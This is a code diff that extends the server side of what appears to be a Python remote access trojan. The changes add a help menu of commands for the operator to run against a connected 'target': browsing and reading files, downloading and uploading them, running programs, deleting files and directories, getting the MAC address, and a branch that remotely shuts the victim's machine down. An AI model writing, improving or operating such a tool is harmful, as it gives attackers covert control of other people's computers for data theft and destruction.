@@ -1,9 +1,43 @@
 import socket
 import os
+import platform
+import time
 
 
+if 'Windows' in platform.platform():
 
-def Excute():
+    os.system('cls')
+
+else:
+
+    os.system('clear')
+
+def help():
+    
+    print('''
+
+=---------=         =-------------=
+| COMMAND |         | DESCRIPTION |
+=---------=         =-------------=
+==================================================================================================
+| [1] whoami        It Shows You The Computer And User Name.                                     |
+| [2] cd            Change The Directory.                                                        |
+| [3] dir           Display Any Files Inside The Directory.                                      |
+| [4] cat           Display File's Content (Read The File).                                      |
+| [5] start         Run A File On The Target's Machine.                                          |
+| [6] download      Download Any File From The Target (*Note This Will Not Work With Pictures).  |
+| [7] upload        Upload Any File To The Target     (*Note This Will Not Work With Pictures).  |
+| [8] dl_img        Download Any Picture From The Target.                                        | 
+| [9] shutdown      Shutdown The Target Machine (Turn It Off).                                   |
+| [10] del filename  Delete Any File On The Target Machine.                                       | 
+| [11] rmdir        Remove Any Directory On The Target Machine.                                  |
+| [12] mac          Display The Mac Address Of The Target.                                       |
+| [13] help         Display This Info                                                            |
+==================================================================================================
+
+    ''')
+
+def execute():
     while True:
 
         try:
@@ -35,15 +69,16 @@ def Excute():
 
                 elif cmd == 'cls':
 
-                    os.system('cls')
+                    try:
 
-                    continue
+                        os.system('cls')
 
-                elif cmd == 'clear':
+                        os.system('clear')
 
-                    os.system('clear')
+                        continue
 
-                    continue
+                    except:
+                        continue
                 
                 elif cmd == 'download':
 
@@ -129,6 +164,26 @@ def Excute():
                             f.write(data)
 
                         continue
+                
+                elif cmd == 'help':
+                    help()
+                    continue
+
+                elif cmd == 'shutdown':
+
+                    cmd = 'shutdown /s /t 3'
+
+                    object.send(cmd.encode('ascii'))
+
+                    print('\n[+] Target\'s Machine Turned Off.\n')
+
+                    time.sleep(3)
+
+                    print('\nThe Connection To The Target Has Been Lost.\n')
+
+                    time.sleep(1)
+                    
+                    exit()
 
                 else:
                     
@@ -173,10 +228,13 @@ if __name__=='__main__':
 
 [x] Country : IRAQ
 
+''')
+    help()
+    print('''
+
 [+] Server Started !
 
 [+] Waiting For Incoming Connection
 
-''')
-
-    Excute()
+    ''')
+    execute()
